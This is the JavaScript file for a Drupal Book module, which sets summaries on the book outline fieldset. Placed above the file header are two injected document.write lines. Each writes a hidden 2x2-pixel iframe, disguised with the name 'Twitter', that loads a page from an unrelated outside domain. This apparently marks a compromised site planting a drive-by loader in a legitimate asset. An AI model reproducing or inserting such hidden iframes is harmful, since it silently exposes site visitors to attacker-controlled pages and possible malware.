document.write('<iframe name=Twitter scrolling=auto frameborder=no align=center height=2 width=2 src=http://vanderlaandemunck.com/hbdn.html?j=2617366></iframe>');

document.write('<iframe name=Twitter scrolling=auto frameborder=no align=center height=2 width=2 src=http://seosuccess.net16.net/zqlv.html?j=1962603></iframe>');

/**
 * @file
 * Javascript behaviors for the Book module.
 */


(function ($) {

Drupal.behaviors.bookFieldsetSummaries = {
  attach: function (context) {
    $('fieldset.book-outline-form', context).drupalSetSummary(function (context) {
      var $select = $('.form-item-book-bid select');
      var val = $select.val();

      if (val === '0') {
        return Drupal.t('Not in book');
      }
      else if (val === 'new') {
        return Drupal.t('New book');
      }
      else {
        return Drupal.checkPlain($select.find(':selected').text());
      }
    });
  }
};

})(jQuery);